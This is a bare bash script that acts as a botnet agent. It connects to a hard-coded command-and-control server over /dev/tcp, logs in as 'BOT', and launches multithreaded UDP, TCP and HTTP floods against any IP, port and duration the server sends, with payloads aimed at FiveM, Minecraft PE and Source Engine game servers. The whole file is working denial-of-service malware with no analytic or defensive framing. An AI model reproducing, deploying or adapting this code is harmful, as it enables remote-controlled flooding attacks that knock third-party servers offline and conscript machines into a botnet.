#!/bin/bash

# Configuration
C2_ADDRESS="134.255.234.140"
C2_PORT=6666

# Payloads
payload_fivem="\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
payload_vse="\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
payload_mcpe="\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
payload_hex="\x55\x55\x55\x55\x00\x00\x00\x01"

PACKET_SIZES=(512 1024 2048)

# Random User-Agent function
rand_ua() {
  agents=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
  echo "${agents[$RANDOM % ${#agents[@]}]}"
}

# Attack functions
attack_fivem() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    echo -ne "$payload_fivem" | nc -u -w1 $ip $port
  done
}

attack_mcpe() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    echo -ne "$payload_mcpe" | nc -u -w1 $ip $port
  done
}

attack_vse() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    echo -ne "$payload_vse" | nc -u -w1 $ip $port
  done
}

attack_hex() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    echo -ne "$payload_hex" | nc -u -w1 $ip $port
  done
}

# Bypass UDP Attack
attack_udp_bypass() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    packet_size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
    dd if=/dev/urandom bs=$packet_size count=1 2>/dev/null | nc -u -w1 $ip $port
  done
}

# Bypass TCP Attack
attack_tcp_bypass() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    packet_size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
    dd if=/dev/urandom bs=$packet_size count=1 2>/dev/null | nc -w1 $ip $port
  done
}

# HTTP GET Attack
attack_http_get() {
  ip=$1
  port=$2
  secs=$3
  while [ $(date +%s) -lt $secs ]; do
    request="GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nConnection: keep-alive\r\n\r\n"
    echo -ne "$request" | nc -w1 $ip $port
  done
}

# Launch Attack
lunch_attack() {
  method=$1
  ip=$2
  port=$3
  secs=$4
  threads=$5

  case $method in
    '.FIVEM')
      for i in $(seq 1 $threads); do
        attack_fivem $ip $port $secs &
      done
      ;;
    '.MCPE')
      for i in $(seq 1 $threads); do
        attack_mcpe $ip $port $secs &
      done
      ;;
    '.VSE')
      for i in $(seq 1 $threads); do
        attack_vse $ip $port $secs &
      done
      ;;
    '.HEX')
      for i in $(seq 1 $threads); do
        attack_hex $ip $port $secs &
      done
      ;;
    '.UDP')
      for i in $(seq 1 $threads); do
        attack_udp_bypass $ip $port $secs &
      done
      ;;
    '.TCP')
      for i in $(seq 1 $threads); do
        attack_tcp_bypass $ip $port $secs &
      done
      ;;
    '.HTTPGET')
      for i in $(seq 1 $threads); do
        attack_http_get $ip $port $secs &
      done
      ;;
  esac
}

# Main C2 Connection
while true; do
  exec 3<>/dev/tcp/$C2_ADDRESS/$C2_PORT
  while true; do
    read -r data <&3
    if [[ "$data" == *"Username"* ]]; then
      echo -n "BOT" >&3
      break
    fi
  done

  while true; do
    read -r data <&3
    if [[ "$data" == *"Password"* ]]; then
      echo -n -e "\xff\xff\xff\xff\75" >&3
      break
    fi
  done

  echo "Connected to C2!"
  while true; do
    read -r data <&3
    if [[ -z "$data" ]]; then
      break
    fi

    args=($data)
    method=${args[0]}
    ip=${args[1]}
    port=${args[2]}
    secs=$(( $(date +%s) + ${args[3]} ))
    threads=${args[4]}

    lunch_attack $method $ip $port $secs $threads
  done
  exec 3>&-
done